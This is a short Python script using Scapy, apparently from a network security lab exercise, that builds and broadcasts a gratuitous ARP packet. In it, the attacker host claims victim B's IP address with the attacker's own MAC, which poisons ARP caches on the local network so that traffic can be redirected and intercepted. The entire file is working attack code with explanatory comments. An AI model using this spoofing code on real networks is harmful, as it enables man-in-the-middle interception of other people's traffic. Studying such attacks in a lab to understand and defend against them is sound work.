from scapy.all import *

# Victim A's values
a_mac   = "02:42:0a:09:00:05"   # MAC of A
a_ip    = "10.9.0.5"            # IP of A

# Victim B's values
b_mac   = "02:42:0a:09:00:06"   # MAC of B
b_ip    = "10.9.0.6"            # IP of B

# Attacker's values
m_mac   = "02:42:0a:09:00:69"   # MAC of M
m_ip    = "10.9.0.105"          # IP of M

# Build gratuitous ARP
arp_grat = ARP(
    op=1,                       # ARP request
    psrc=b_ip,                  # Claim to be B (pretending to be B IP Address)
    hwsrc=m_mac,                # Send M's MAC (attacker's MAC)
    pdst=b_ip,                  # Destination IP same as source (gratuitous)
    hwdst="00:00:00:00:00:00"   # Ignored in request, optional
)

eth = Ether(src=m_mac, dst="ff:ff:ff:ff:ff:ff") # Broadcast MAC address

pkt = eth / arp_grat        # Combine Ethernet and ARP layers
sendp(pkt, iface="eth0")    # Send the packet on the specified interface
